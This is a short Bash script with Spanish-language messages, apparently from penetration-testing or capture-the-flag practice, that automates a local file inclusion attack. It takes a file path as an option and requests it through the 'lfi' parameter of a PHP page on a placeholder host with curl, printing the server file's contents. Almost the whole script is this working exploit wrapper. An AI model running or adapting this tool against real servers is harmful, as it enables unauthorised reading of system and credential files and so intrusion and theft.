#!/bin/bash

#Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
  exit 1
}

# Ctrl+C
trap ctrl_c INT

declare -i parameter_counter=0

function fileRead(){
  filename=$1

  echo -e "\n${yellowColour}[+]${grayColour} Este es el contenido del archivo ${redColour}$filename${grayColour}:$endColour\n"
  curl -s -X GET "http://web.com/l/f/i.php?lfi=$filename"
}

function helpPanel ()
{
  echo -e "\n${yellowColour}[i]${grayColour} Uso:\n"
  echo -e "\t${redColour}h) ${blueColour}Mostrar este panel de ayuda"
  echo -e "\t${redColour}f) ${blueColour}Proporcionar ruta del archivo a leer${endColour}\n"
  exit 0
}

while getopts "hf:" arg; do
  case $arg in
    h) ;;
    f) filename=$OPTARG; let parameter_counter+=1;;
  esac
done

if [[ $parameter_counter -eq 1 ]]; then
  fileRead "$filename"
else
  helpPanel
fi
